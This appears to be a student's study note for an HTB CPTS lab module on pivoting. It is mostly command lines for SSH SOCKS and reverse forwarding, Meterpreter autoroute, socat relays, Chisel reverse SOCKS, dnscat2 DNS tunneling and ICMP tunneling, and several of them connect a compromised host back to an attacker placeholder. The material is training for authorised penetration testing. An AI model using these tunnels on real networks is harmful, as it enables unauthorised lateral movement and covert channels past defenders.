# 12 — Pivoting, Tunneling, and Port Forwarding

> **Path Phase:** Post-Exploitation | **Difficulty:** Medium | **Sections:** 18

Moving through internal networks — SSH tunneling, SOCKS proxies, Chisel, sshuttle, and more. Essential for the CPTS exam's segmented network.

> ℹ️ `<PIVOT>` = compromised host, `<INTERNAL>` = internal target, `<YOUR_IP>` = attacker.

---

## Table of Contents
1. Introduction
2. The Networking Behind Pivoting
3. Dynamic Port Forwarding with SSH & SOCKS
4. Remote/Reverse Port Forwarding with SSH
5. Meterpreter Tunneling & Port Forwarding
6. Socat Redirection with a Reverse Shell
7. Socat Redirection with a Bind Shell
8. SSH for Windows: plink.exe
9. SSH Pivoting with sshuttle
10. Web Server Pivoting with Rpivot
11. Port Forwarding with Windows: Netsh
12. DNS Tunneling with Dnscat2
13. SOCKS5 Tunneling with Chisel
14. ICMP Tunneling with SOCKS
15. RDP and SOCKS Tunneling with SocksOverRDP
16. Skills Assessment
17. Detection & Prevention
18. Beyond this Module

---

## 2 — Networking Behind Pivoting
```bash
ip a ; arp -a ; route      # find other networks on pivot
```

## 3 — Dynamic Port Forwarding (SSH + SOCKS)
```bash
ssh -D 9050 user@<PIVOT>
# /etc/proxychains.conf → socks5 127.0.0.1 9050
proxychains nmap -sT -Pn <INTERNAL>
proxychains xfreerdp /v:<INTERNAL> /u:user /p:pass
```

## 4 — Remote/Reverse Port Forwarding
```bash
ssh -R 8080:localhost:80 user@<YOUR_IP>
```

## 5 — Meterpreter Tunneling
```bash
run autoroute -s <INTERNAL_SUBNET>/24
portfwd add -l 3389 -p 3389 -r <INTERNAL>
use auxiliary/server/socks_proxy
set SRVPORT 9050 ; run
```

## 6–7 — Socat Redirection
```bash
socat TCP4-LISTEN:8080,fork TCP4:<YOUR_IP>:443
socat TCP4-LISTEN:8080,fork TCP4:<INTERNAL>:8443
```

## 8 — plink.exe (Windows)
```cmd
plink.exe -ssh -D 9050 user@<YOUR_IP>
plink.exe -R 8080:127.0.0.1:80 user@<YOUR_IP>
```

## 9 — sshuttle
```bash
sshuttle -r user@<PIVOT> <INTERNAL_SUBNET>/24
```

## 10 — Rpivot
```bash
python2 server.py --server-port 9999 --proxy-port 9050
python2 client.py --server-ip <YOUR_IP> --server-port 9999
```

## 11 — Netsh (Windows)
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<PIVOT_IP> connectport=3389 connectaddress=<INTERNAL>
```

## 12 — Dnscat2
```bash
dnscat2-server <domain>      # attacker
./dnscat <domain>            # pivot
```

## 13 — SOCKS5 with Chisel (favorite)
```bash
./chisel server -p 8080 --reverse            # attacker
./chisel client <YOUR_IP>:8080 R:socks       # pivot
proxychains nmap -sT -Pn <INTERNAL>
```

## 14–15 — ICMP / SocksOverRDP
```bash
sudo ./ptunnel-ng -r<YOUR_IP> -R22
# SocksOverRDP-Plugin + Proxifier for RDP channel
```

## 16 — Skills Assessment
```bash
ip a ; arp -a
./chisel server -p 8080 --reverse
./chisel client <YOUR_IP>:8080 R:socks
proxychains crackmapexec smb <INTERNAL>
```
> **Skills Assessment:** ✅ Completed in lab (answers withheld per HTB Academy policy)

## 17–18 — Detection & Beyond
Defenders watch tunneling traffic, long connections, DNS anomalies. Ligolo-ng is the modern favorite.

---

## 🧰 Tools Used
| Technique | Tools |
|-----------|-------|
| SSH tunneling | `ssh -D/-R/-L`, `plink.exe`, `sshuttle` |
| SOCKS proxy | `chisel`, `proxychains`, `rpivot` |
| Relays | `socat`, `netsh` |
| Covert | `dnscat2`, `ptunnel-ng` |

## 🔑 Key Takeaways
- **Chisel + proxychains** is the most reliable modern pivot — master it.
- `sshuttle` gives transparent routing (no proxychains).
- Always enumerate the pivot's extra interfaces first.
- Meterpreter `autoroute` + `socks_proxy` keeps everything in MSF.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
